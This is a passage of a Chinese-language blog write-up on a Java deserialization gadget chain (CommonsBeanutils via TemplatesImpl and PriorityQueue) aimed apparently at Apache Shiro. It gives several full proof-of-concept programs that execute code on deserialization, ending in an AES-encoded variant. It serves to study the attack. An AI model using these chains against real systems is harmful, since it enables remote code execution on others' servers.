class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClass</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>        <span class="hljs-comment">//setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);</span><br>        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br>        templates.get<span class="hljs-constructor">TransletIndex()</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功运行，但没有结果，我们可以看一看getTransletIndex方法</p>
+<p><img src="/img/markdown-img-paste-20211126103049844.png" srcset="/img/loading.gif" lazyload></p>
+<p>它调用了defineTransletClasses，但却没有对其进行初始化</p>
+<p>为了验证以下，我们对getTransletClasses方法进行测试</p>
+<p><img src="/img/markdown-img-paste-2021112610452128.png" srcset="/img/loading.gif" lazyload></p>
+<p>此方法调用了defineTransletClasses，同时返回了加载的类</p>
+<p>测试代码</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;<br>    Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;<br>    field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    field.set(obj, value);<br>&#125;<br><br>public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClass</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>    <span class="hljs-comment">//setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);</span><br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br>    <span class="hljs-comment">//templates.getTransletIndex();</span><br>    Method <span class="hljs-keyword">method</span> = templates.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;getTransletClasses&quot;</span>)</span>;<br>    <span class="hljs-keyword">method</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    Class<span class="hljs-literal">[]</span> cls = (Class<span class="hljs-literal">[]</span>) <span class="hljs-keyword">method</span>.invoke(templates,<span class="hljs-keyword">new</span> Object<span class="hljs-literal">[]</span>&#123;&#125;);<br>    cls<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>运行结果是成功弹出计算器</p>
+<p>因此我们需要找newInstance()方法</p>
+<p>最终在getTransletInstance中，同时存在defineTransletClasses和newInstance的调用</p>
+<p><img src="/img/markdown-img-paste-20211126143332141.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析代码，发现同时需要满足以下条件</p>
+<ul>
+<li>_name值不为零</li>
+<li>_bytecodes中字节码所包含的类需要继承AbstractTranslet类(因为这里有一个强制转换)</li>
+</ul>
+<p>但由于getTransletInstance是一个私有方法，因此还需要找getTransletInstance的被调情况</p>
+<h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer"></a>newTransformer</h3><p>在newTransformer找到getTransletInstance的调用</p>
+<p><img src="/img/markdown-img-paste-20211126105027463.png" srcset="/img/loading.gif" lazyload></p>
+<p>测试代码</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;<br>    Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;<br>    field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    field.set(obj, value);<br>&#125;<br><br>public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClass</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>)</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br>    templates.<span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功运行计算器</p>
+<h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties"></a>getOutputProperties</h3><p>在getOutputProperties方法中，存在对newTransformer的调用，因此也可以实现利用</p>
+<p><img src="/img/markdown-img-paste-20211126105316758.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception &#123;<br>    Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;<br>    field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;<br>    field.set(obj, value);<br>&#125;<br><br>public static void main(String<span class="hljs-literal">[]</span> argv) throws Exception&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][]&#123; ClassPool.<span class="hljs-params">getDefault</span>()</span>.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EvilClass</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>).<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>&#125;);<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>)</span>;<br>    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);<br>    templates.get<span class="hljs-constructor">OutputProperties()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>同时由于TemplatesImpl存在_outputProperties变量，因此可以结合commons-beanutils或者fastjson实现一个链式调用。</p>
+<h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><p>PriorityQueue是一个用来处理优先队列的类，位于java.util包中</p>
+<h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3><p><img src="/img/markdown-img-paste-20211126111845691.png" srcset="/img/loading.gif" lazyload></p>
+<p>在其中调用了heapify方法</p>
+<h3 id="heapify"><a href="#heapify" class="headerlink" title="heapify"></a>heapify</h3><p><img src="/img/markdown-img-paste-2021112611192302.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用了siftDown方法</p>
+<h3 id="siftDown"><a href="#siftDown" class="headerlink" title="siftDown"></a>siftDown</h3><p><img src="/img/markdown-img-paste-20211126111949291.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里有一个判断，判断comparator是否为空，不为空则进入siftDownUsingComparator</p>
+<p>回头看一下PriorityQueue的构造函数<br><img src="/img/markdown-img-paste-20211126112045274.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现comparator的值在初始化的时候已经赋值</p>
+<h3 id="siftDownUsingComparator"><a href="#siftDownUsingComparator" class="headerlink" title="siftDownUsingComparator"></a>siftDownUsingComparator</h3><p><img src="/img/markdown-img-paste-20211126112132509.png" srcset="/img/loading.gif" lazyload></p>
+<p>在siftDownUsingComparator中我们可以看到，siftDownUsingComparator对自身数组中的两个值，调用了comparator.compare方法进行比较。属于一个自动化调用</p>
+<h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>在前文的分析中，我们可以发现以下情况</p>
+<ul>
+<li>TemplatesImpl中存在getOutputProperties方法，构造好TemplatesImpl对象并实现getOutputProperties的调用可以实现任意代码执行</li>
+<li>commons-beanutils中的PropertyUtils.getProperty(Object bean, String name)方法可以调用bean的get(name)方法</li>
+<li>BeanComparator.compare中存在PropertyUtils.getProperty方法的调用</li>
+<li>PriorityQueue反序列化时可以调用comparator.compare方法</li>
+</ul>
+<p>因此，可以做到一个巧妙的串联</p>
+<p>POC代码</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package com.javasec.shiro;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.*;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-keyword">class</span> Evil extends AbstractTranslet &#123;<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler <span class="hljs-keyword">handler</span>) &#123;<br>        &#125;<br><br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-built_in">public</span> Evil() throws <span class="hljs-keyword">Exception</span>&#123;<br>            Runtime.getRuntime().exec(&quot;calc&quot;);<br>        &#125;<br><br>        <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>            EvilClass helloworld = <span class="hljs-built_in">new</span> EvilClass();<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> setFieldValue(<span class="hljs-keyword">Object</span> obj, String fieldName, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>) throws <span class="hljs-keyword">Exception</span> &#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.<span class="hljs-keyword">set</span>(obj, <span class="hljs-keyword">value</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] argv) throws <span class="hljs-keyword">Exception</span>&#123;<br>        TemplatesImpl templates = <span class="hljs-built_in">new</span> TemplatesImpl();<br>        setFieldValue(templates,&quot;_bytecodes&quot;, <span class="hljs-built_in">new</span> byte[][]&#123; ClassPool.getDefault().<span class="hljs-keyword">get</span>(Evil.<span class="hljs-keyword">class</span>.getName()).toBytecode()&#125;);<br>        setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);<br>        setFieldValue(templates,&quot;_tfactory&quot;, <span class="hljs-built_in">new</span> TransformerFactoryImpl());<br><br>        BeanComparator beanComparator = <span class="hljs-built_in">new</span> BeanComparator();<br>        PriorityQueue priorityQueue = <span class="hljs-built_in">new</span> PriorityQueue(<span class="hljs-number">2</span>,beanComparator);<br><br>        priorityQueue.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>);<br>        priorityQueue.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>);<br><br>        setFieldValue(beanComparator,&quot;property&quot;, &quot;outputProperties&quot;);<br>        setFieldValue(priorityQueue,&quot;queue&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;templates,templates&#125;);<br><br>        ByteArrayOutputStream barr = <span class="hljs-built_in">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-built_in">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(priorityQueue);<br>        oos.<span class="hljs-keyword">close</span>();<br><br>        ObjectInputStream ois = <span class="hljs-built_in">new</span> ObjectInputStream(<span class="hljs-built_in">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        <span class="hljs-keyword">Object</span> o = (<span class="hljs-keyword">Object</span>)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功弹出计算器</p>
+<p>但是这个POC真的就没有任何依赖吗？我们知道commons-beanutils库部份依赖commons-conllections这个库，观察其构造函数</p>
+<p><img src="/img/markdown-img-paste-20211126145104338.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到在没有传入comparator时，或默认调用ComparableComparator.getInstance()方法。而我们跟踪发现，这个方法属于commons-conllections包中的方法</p>
+<p><img src="/img/markdown-img-paste-20211126145204627.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果我们删除commons-conllections依赖，再运行刚才的POC，就会收获如下错误</p>
+<p><img src="/img/markdown-img-paste-20211126150310555.png" srcset="/img/loading.gif" lazyload></p>
+<p>因此我们需要找到一个替代的方法<br>它需要满足以下几点</p>
+<ul>
+<li>实现java.util.Comparator接口</li>
+<li>实现java.io.Serializable接口</li>
+<li>Java、shiro或commons-beanutils自带</li>
+</ul>
+<p>根据IDEA得快捷键ctrl+alt+B，可以快速得找到目标类<br>我这里找的是Headers$InsensitiveComparator类<br>实现代码</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package com.javasec.shiro;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.*;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-keyword">class</span> Evil extends AbstractTranslet &#123;<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler <span class="hljs-keyword">handler</span>) &#123;<br>        &#125;<br><br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-built_in">public</span> Evil() throws <span class="hljs-keyword">Exception</span>&#123;<br>            Runtime.getRuntime().exec(&quot;calc&quot;);<br>        &#125;<br><br>        <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>            EvilClass helloworld = <span class="hljs-built_in">new</span> EvilClass();<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> setFieldValue(<span class="hljs-keyword">Object</span> obj, String fieldName, <span class="hljs-keyword">Object</span> <span class="hljs-keyword">value</span>) throws <span class="hljs-keyword">Exception</span> &#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.<span class="hljs-keyword">set</span>(obj, <span class="hljs-keyword">value</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] argv) throws <span class="hljs-keyword">Exception</span>&#123;<br>        TemplatesImpl templates = <span class="hljs-built_in">new</span> TemplatesImpl();<br>        setFieldValue(templates,&quot;_bytecodes&quot;, <span class="hljs-built_in">new</span> byte[][]&#123; ClassPool.getDefault().<span class="hljs-keyword">get</span>(Evil.<span class="hljs-keyword">class</span>.getName()).toBytecode()&#125;);<br>        setFieldValue(templates,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);<br>        setFieldValue(templates,&quot;_tfactory&quot;, <span class="hljs-built_in">new</span> TransformerFactoryImpl());<br><br>        <span class="hljs-keyword">Class</span> clss = <span class="hljs-keyword">Class</span>.forName(&quot;com.sun.xml.internal.ws.transport.Headers$InsensitiveComparator&quot;);<br>        Constructor constructor = clss.getDeclaredConstructor();<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">Object</span> ob = constructor.newInstance();<br><br>        BeanComparator beanComparator = <span class="hljs-built_in">new</span> BeanComparator(<span class="hljs-keyword">null</span>, (Comparator) ob);<br>        PriorityQueue priorityQueue = <span class="hljs-built_in">new</span> PriorityQueue(<span class="hljs-number">2</span>,beanComparator);<br><br>        priorityQueue.<span class="hljs-keyword">add</span>(&quot;a&quot;);<br>        priorityQueue.<span class="hljs-keyword">add</span>(&quot;a&quot;);<br><br>        setFieldValue(beanComparator,&quot;property&quot;, &quot;outputProperties&quot;);<br>        setFieldValue(priorityQueue,&quot;queue&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;templates,templates&#125;);<br><br>        ByteArrayOutputStream barr = <span class="hljs-built_in">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-built_in">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(priorityQueue);<br>        oos.<span class="hljs-keyword">close</span>();<br><br>        ObjectInputStream ois = <span class="hljs-built_in">new</span> ObjectInputStream(<span class="hljs-built_in">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        <span class="hljs-keyword">Object</span> o = (<span class="hljs-keyword">Object</span>)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>P牛的文章里用的是CaseInsensitiveComparator类，比我的POC更简洁(到底还是老师傅)</p>
+<p><img src="/img/markdown-img-paste-2021112616022676.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="最终版"><a href="#最终版" class="headerlink" title="最终版"></a>最终版</h3><p>最后添加上Aes加密和Base64加密</p>
+<p>完整代码</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">package com.javasec.shiro;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.*;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.CodecSupport;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.mgt.AbstractRememberMeManager;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.<span class="hljs-keyword">Method</span>;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> Test &#123;<br><br>    <span class="hljs-built_in">public</span> static <span class="hljs-keyword">class</span> Evil extends AbstractTranslet &#123;<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, DTMAxisIterator iterator, SerializationHandler <span class="hljs-keyword">handler</span>) &#123;<br>        &#125;<br><br><br>        <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> <span class="hljs-keyword">transform</span>(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-built_in">public</span> Evil() throws <span class="hljs-keyword">Exception</span>&#123;<br>            Runtime.getRuntime().exec(&quot;calc&quot;);<br>        &#125;<br><br>        <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws <span class="hljs-keyword">Exception</span> &#123;<br>            